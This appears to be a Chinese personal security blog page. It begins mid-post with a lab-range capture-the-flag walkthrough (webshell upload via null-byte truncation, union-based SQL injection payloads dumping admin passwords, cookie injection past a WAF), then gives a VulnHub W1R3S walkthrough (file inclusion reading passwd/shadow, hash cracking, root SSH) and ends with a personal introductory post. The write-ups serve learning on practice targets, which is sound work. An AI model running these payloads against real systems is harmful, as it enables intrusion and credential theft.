<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8756.png" class title="This is an test image">

<p>成功登录</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8757.png" class title="This is an test image">

<p>上传木马</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8758.png" class title="This is an test image">

<p>文件上传成功</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8759.png" class title="This is an test image">

<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8760.png" class title="This is an test image">

<p>在保存信息的路径下添加888.asp.jpg，在16进制数中找到asp后的.进行00截断。将2e改为00</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8761.png" class title="This is an test image">

<p>输入保存路径+888.asp打开网页显示木马添加成功</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8762.png" class title="This is an test image">

<p>打开菜刀，将木马路径输入进去</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8763.png" class title="This is an test image">

<p>双击网址，打开即可看到任意盘下的文件并进行更改</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8764.png" class title="This is an test image">



<h3 id="尤里的复仇-sql注入"><a href="#尤里的复仇-sql注入" class="headerlink" title="尤里的复仇-sql注入"></a>尤里的复仇-sql注入</h3><img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8765.png" class title="This is an test image">

<p><strong>判断是否存在SQL注入漏洞</strong></p>
<p>1.构造 ?id&#x3D;1 and 1&#x3D;1 ，回车观察页面是否正常</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8766.png" class title="This is an test image"> 

<p>页面返回正常，可知 and 这个参数注入进去被当成SQL语句执行了。</p>
<p>2.构造 and 1&#x3D;2</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8767.png" class title="This is an test image">

<p>页面不正常,初步判断这里可能存在一个注入漏洞</p>
<p><strong>判断字段数</strong></p>
<p>构造 ?id&#x3D;1 and 1&#x3D;1 order by 1 回车</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8768.png" class title="This is an test image">

<p>页面返回正常，进行第二步，构造 ?id&#x3D;1 and 1&#x3D;1 order by 2 回车</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8769.png" class title="This is an test image">

<p>页面显示正常，进行第三步，构造 ?id&#x3D;1 and 1&#x3D;1 order by 3 回车</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8770.png" class title="This is an test image">

<p>页面返回 错误，判断字段数为 2（判断字符数只有两个）</p>
<p><strong>判断回显点</strong></p>
<p>构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,2 回车</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8771.png" class title="This is an test image">

<p>页面出现了 2 ，说明我们可以在数字 2 处显示我们想要的内容</p>
<p><strong>查询相关内容</strong></p>
<p>查询当前数据库名：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,database() 回车</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8772.png" class title="This is an test image">

<p>页面回显maoshe</p>
<p>查询当前数据库版本：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,version() 回车</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8773.png" class title="This is an test image">

<p>回显版本号为5.5.53</p>
<p>查询当前数据库 表名：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1 回车</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8774.png" class title="This is an test image">

<p>页面回显admin</p>
<p>绝大数情况下，管理员的账号密码都在admin表里。</p>
<p>查询字段名：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’admin’ limit 0,1 回车</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8775.png" class title="This is an test image">

<p>回显字段名为id</p>
<p>构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’admin’ limit 1,1 回车</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8776.png" class title="This is an test image">

<p>构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’admin’ limit 2,1 回车</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8777.png" class title="This is an test image">

<p>回显password</p>
<p>构造语句输出账号密码： ?id&#x3D;1 and 1&#x3D;2 union select 1,password from admin limit 0,1 回车</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8778.png" class title="This is an test image">

<p>回显hellohack 得到管理员账号和密码为：hellokack</p>
<p>得到flag</p>
<h3 id="尤里的复仇-信息收集1"><a href="#尤里的复仇-信息收集1" class="headerlink" title="尤里的复仇-信息收集1"></a>尤里的复仇-信息收集1</h3><img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8779.png" class title="This is an test image">

<p>用御剑进行扫描，flag在二级目录里</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8780.png" class title="This is an test image">

<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8781.png" class title="This is an test image">

<p>点击链接，得到flag</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8782.png" class title="This is an test image">





<h3 id="尤里的复仇-绕过WAF"><a href="#尤里的复仇-绕过WAF" class="headerlink" title="尤里的复仇-绕过WAF"></a>尤里的复仇-绕过WAF</h3><img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8783.png" class title="This is an test image">

<p>随便点击一个新闻。在id&#x3D;171后面加一个引号’，测试一下是否有SQL注入</p>
<p>有弹框了，提示过滤了很多关键字。下一步考虑如何绕过这些关键字</p>
<p>因为网页做了waf过滤防护，这里考虑用cookie注入，可以进行绕过</p>
<p>这里使用一个小工具进行注入</p>
<p>打开这款插件直接在value处填写注入参数即可然后按上面的键开始（value中的值需要注意的是空格用+表示）</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8784.png" class title="This is an test image">

<p>出现账号和密码</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8785.png" class title="This is an test image">

<p>将密码md5解密</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8786.png" class title="This is an test image">

<p>用御剑进行扫描，获得后台地址：</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8787.png" class title="This is an test image">

<p>输入之前获得的用户名和密码</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8788.png" class title="This is an test image">

<p>成功拿到flag</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8789.png" class title="This is an test image">

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://acindm.github.io/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="Welcome to the 1/30000 🫧">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="acind の blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/" class="post-title-link" itemprop="url">W1R3S</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-10-18 15:41:58" itemprop="dateCreated datePublished" datetime="2023-10-18T15:41:58+08:00">2023-10-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-03-12 09:16:39" itemprop="dateModified" datetime="2024-03-12T09:16:39+08:00">2024-03-12</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.4k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>5 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="w1r3s靶场"><a href="#w1r3s靶场" class="headerlink" title="w1r3s靶场"></a>w1r3s靶场</h3><p>环境搭建：在<a target="_blank" rel="noopener" href="https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html">VMware</a> Workstation中安装<a target="_blank" rel="noopener" href="https://www.kali.org/">Kali</a> linux和<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/w1r3s-101,220/">靶机w1r3s</a></p>
<p><strong>Nmap主机发现</strong></p>
<p>此命令可显示当前系统中所有网络接口的详细信息，由此可知本机IP地址: 192.168.184.134&#x2F;24</p>
<p>此步骤目的是为了下一步扫描出目标靶机的IP地址</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%871.png" class title="This is an test image">

<p>扫描该子网中的所有主机，nmap 将发送 ICMP Echo Request 包(ping)到指定子网的每个 IP 地址，并根据响应来判断主机是否在线。返回结果可以看到在线主机的 IP 地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo: 以超级用户权限执行命令</span><br><span class="line"></span><br><span class="line">nmap: 扫描工具</span><br><span class="line"></span><br><span class="line">-sn: 表示进行主机发现而不进行端口扫描，仅打印出对扫描做出响应的主机</span><br></pre></td></tr></table></figure>

 <img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%872.png" class title="This is an test image">

<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%873.png" class title="This is an test image">

<p>第一次扫描未开靶机，第二次扫描前将靶机打开，通过前后两次扫描结果的对比我们可以发现目标靶机的 ip 是 192.168.184.129</p>
<p><strong>端口扫描</strong></p>
<p>先创建（mkdir）一个目录来存放数据，再创建一个子目录来存放nmap扫描的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-p:创建目标目录的上级目录</span><br><span class="line"></span><br><span class="line">cd:切换路径</span><br></pre></td></tr></table></figure>

<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%874.png" class title="This is an test image">



<p><strong>执行端口扫描</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-sS：表示使用TCP SYN扫描方式</span><br><span class="line"></span><br><span class="line">-p-：表示对全部端口进行扫描</span><br><span class="line"></span><br><span class="line">-oN：用于将扫描结果保存到文件（后加路径）</span><br></pre></td></tr></table></figure>

<p>可以看到四个开放的端口和对应的服务（21:ftp,22:ssh,80:http,3306:mysql）</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%875.png" class title="This is an test image">

<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%876.png" class title="This is an test image">

<p>端口提取命令，为了后续方便，将各个端口提取出来放到变量中</p>
<p><strong>详细信息扫描</strong></p>
<p>显示匿名FTP登录被允许，并且有三个客户端连接。此外，还显示了一些目录的信息，例如content、docs和new-employees。</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%877.png" class title="This is an test image">



<p><strong>UDP扫描</strong></p>
<p>目的是识别目标主机上开放的UDP（User Datagram Protocol）端口。</p>
<p>结果显示，所有100个扫描的端口都处于被忽略状态。具体来说，目标主机没有对UDP端口作出明确的响应，因此无法判断端口是否开放或关闭。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-sU：udp 扫描</span><br><span class="line"></span><br><span class="line">--top-ports 100：扫描最常见的 100 个端口</span><br></pre></td></tr></table></figure>

<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%878.png" class title="This is an test image">



<p><strong>漏洞脚本扫描</strong></p>
<p>目的是为了发现目标系统中可能存在的漏洞。这些漏洞可能是由软件缺陷、配置错误或安全配置不当等原因引起的，攻击者可以利用这些漏洞来入侵系统、获取未授权的访问权限、窃取敏感信息或导致系统服务不可用。</p>
<p>通过http-enum脚本扫描，发现了WordPress登录页面 &#x2F;wordpress&#x2F;wp-login.php</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%879.png" class title="This is an test image">



<p><strong>FTP匿名登录</strong></p>
<p>目的是为了获取FTP服务器上公开的信息或文件。成功登录，获得访问FTP服务器上公开文件和文件夹的权限。</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8710.png" class title="This is an test image">

<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8711.png" class title="This is an test image"> 

<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8712.png" class title="This is an test image"> 

<p>查看下载下来的文件，01.txt 看到是个新的 ftp 服务器，02.txt 看到两个字符串，03.txt 是个 logo</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8713.png" class title="This is an test image">

<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8714.png" class title="This is an test image"> 

<p>“hash-identifier”是一个用于识别哈希算法的工具，使用MD5解密，得到This is not a password</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8715.png" class title="This is an test image"> 

<p>使用base64解密</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8716.png" class title="This is an test image"> 

<p><strong>mysql 试探</strong></p>
<p>提示不允许登陆</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8717.png" class title="This is an test image"> 

<p><strong>Web渗透</strong></p>
<p>直接访问，看到一个 apache 的默认页面</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8718.png" class title="This is an test image"> 

<p>访问之前 nmap 的 http-enum 得到的 &#x2F;wordpress&#x2F;wp-login.php 发现是一个登陆页面，弱口令无效</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8719.png" class title="This is an test image"> 

<p><strong>目录爆破</strong></p>
<p>用gobuster工具进行目录爆破，用于发现目标网站上隐藏的目录和文件</p>
<p>gobuster dir：指示Gobuster使用目录模式进行枚举。</p>
<p>-w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt：指定用于枚举的字典文件路径。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-u http://192.168.184.12：指定要枚举的目标URL，即&quot;[http://192.168.184.12]</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p>&#x2F;wordpress</p>
<p>&#x2F;javascript</p>
<p>&#x2F;administrator</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8720.png" class title="This is an test image"> 

<p> &#x2F;javascript 提示没有访问权限</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8721.png" class title="This is an test image"> 

<p>&#x2F;administrator 看到一个安装页面，网页标题是 cuppa cms</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8722.png" class title="This is an test image">

<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8723.png" class title="This is an test image"> 

<p><strong>cuppa cms 渗透</strong></p>
<p>SearchSploit是一个用于搜索和浏览漏洞利用数据库的命令行工具</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8724.png" class title="This is an test image"> 

<p>查看文件，发现文件包含漏洞</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8725.png" class title="This is an test image"> 

<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8726.png" class title="This is an test image"> 

<p> 查看利用文件，发现是 &#x2F;alerts&#x2F;alertConfigField.php 出现了漏洞</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8727.png" class title="This is an test image"> 

<p>下载此漏洞，查看具体信息</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8728.png" class title="This is an test image"> 

<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8729.png" class title="This is an test image"> 

<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8730.png" class title="This is an test image"> 

<p>访问目标系统中的敏感文件（passwd存放了用户账户的信息）</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8731.png" class title="This is an test image"> 

<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8732.png" class title="This is an test image"> 

<p>访问目标系统的用户密码文件</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8733.png" class title="This is an test image"> 

<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8734.png" class title="This is an test image"> 

<p>John破解密码</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8735.png" class title="This is an test image"> 

<p>通过SSH协议连接到指定IP地址，成功登录后获取了root权限</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8736.png" class title="This is an test image"> 

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://acindm.github.io/2023/10/14/Hello-My-Blog/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="Welcome to the 1/30000 🫧">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="acind の blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/14/Hello-My-Blog/" class="post-title-link" itemprop="url">起始篇</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-10-14 15:41:58" itemprop="dateCreated datePublished" datetime="2023-10-14T15:41:58+08:00">2023-10-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-03-11 22:27:52" itemprop="dateModified" datetime="2024-03-11T22:27:52+08:00">2024-03-11</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.1k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>4 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="About-this-Blog：What→Why→How"><a href="#About-this-Blog：What→Why→How" class="headerlink" title="About this Blog：What→Why→How"></a>About this Blog：What→Why→How</h1><ul>
<li>想要创建博客记录一下我的Computer Science学习过程 &amp; 一些生活和学习工作的想法 ~（srds有点建晚了，大一就该准备好的呜呜呜Q﹏Q（不过还不算太迟</li>
<li>超严重的强迫症，这些事情写到纸上如果格式之类出问题 or 字写得丑了点，立马就会忍不住撕掉重写（所以Blog+markdown对我来说是好选择，可以多次反复利用）之前为了治这个毛病，特意买了Daycrafts的日程本试图用昂贵的纸张唤醒我节约的意识，结果完美证明：我的强迫症 &gt; 我对银子的心疼😥。总之，Hello My Blog！新的计划开始了~</li>
<li>初定一个小目标，今年每周至少写2篇技术记录！flag已经立好，开始实现！🥳</li>
</ul>
<h2 id="勇气🎞️"><a href="#勇气🎞️" class="headerlink" title="勇气🎞️"></a>勇气🎞️</h2><p>普通家庭出身的大部分人所习惯的模式是竞争与服从，他们周围的环境，甚至他们自己的内心，都好像缺了一些东西——那种真正能让人投身于某个领域的使命感、梦想与可以使用的方法论，我叫它“意识”。</p>
<p>成绩、量化一个人的考核标准，在我更加年轻的时候给了我很多满足——因为我经常在这种“竞争”游戏中胜出。可惜意识不足的个体不会在真正意义上踏上“上行之路”，心态也像地基没有扎稳的房子，摇摇欲坠，不会挺立太久。之后很长一段时间我所面对的，是认知与期望产生巨大落差的挫败，以及明知自己难以迅速填补沟壑、想要得到一些事物就要付出超常的努力，却迟迟驻足原处、不知该走向何处的犹疑。</p>
<p>这种情况在我进入大学之后改善了非常之多，但“改善”还远远不够。这个博客存在的意义就在于，我将在这里记录自己走向有计划且愿意为计划付出全部的未来</p>
<h2 id="感悟🌠"><a href="#感悟🌠" class="headerlink" title="感悟🌠"></a>感悟🌠</h2><p>今天一个寻常的上午，我在寝室一边听歌一边整理、清洗自己的东西。整理东西总是让我有一种整理自己内心的感受——一切都在归位的感觉。前几周的那种紧迫与内心的焦急如潮水褪去。东想西想的时候，我突然心生出一个疑问 “我之前的勇气都到哪里去了？那个本来年轻又有抱负的家伙，怎么现在才有发声的？”</p>
<p>很神奇，甚至看似都没有任何诱发条件，我突然觉得浑身充满了力量，急切地想要去做我计划的事情。勇气回来之后、写博客之前，也没有浪费时间：认真对待我的生活，不去过度解读一些可能诱发不快的事情，坚定地朝向自己的小目标走去并且完成它。</p>
<p>这对我来说，这种对秩序的追求，这种像渴望呼吸一般进步的欲望，真的非常重要。</p>
<p>勇气回来了。内心的激动与明朗难以言喻。我只想要在之后的时间里，一遍遍验证这个事实，想办法让它留下来，不再离开。</p>
<h2 id="YOUTH"><a href="#YOUTH" class="headerlink" title="YOUTH"></a>YOUTH</h2><p><strong>这是我非常喜欢的一首诗，记录于此</strong></p>
<p><em>Samuel Ullman</em></p>
<p>Youth is not a time of life; </p>
<p>it is a state of mind; </p>
<p>it is not a matter of rosy cheeks, red lips and supple knees; </p>
<p>it is a matter of the will, a quality of the imagination, a vigour of the emotions; </p>
<p>it is the freshness of the deep springs of life.</p>
<p>Youth means a temperamental predominance of courage over timidity of the appetite, for adventure over the love of ease. This often exists in a man of sixty more than a boy of twenty. Nobody grows old merely by a number of years. We grow old by deserting our ideals.</p>
<p>Years may wrinkle the skin, but to give up enthusiasm wrinkles the soul. Worry, fear, self-distrust blows the heart and turns the spirit back to dust.</p>
<p>Whether sixty or sixteen, there is in every human being’s heart the lure of wonders, the unfailing childlike appetite of what’s next and the joy of the game of living. In the centre of your heart and my heart there is a wireless station: so long as it receives messages of beauty, hope, cheer, courage and power from men and from the infinite, so long are you young.</p>
<p>When the aerials are down, and your spirit is covered with snows of cynicism and the ice of pessimism, then you are grown old, even at twenty, but as long as your aerials are up, to catch waves of optimism, there is hope you may die young at eighty.</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt=""
      src="/images/avatar.png.jpg">
  <p class="site-author-name" itemprop="name"></p>
  <div class="site-description" itemprop="description">Welcome to the 1/30000 🫧</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">8</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://stackoverflow.com/yourname" title="StackOverflow → https:&#x2F;&#x2F;stackoverflow.com&#x2F;yourname" rel="noopener" target="_blank"><i class="fab fa-stack-overflow fa-fw"></i>StackOverflow</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://github.com/acindm" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;acindm" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
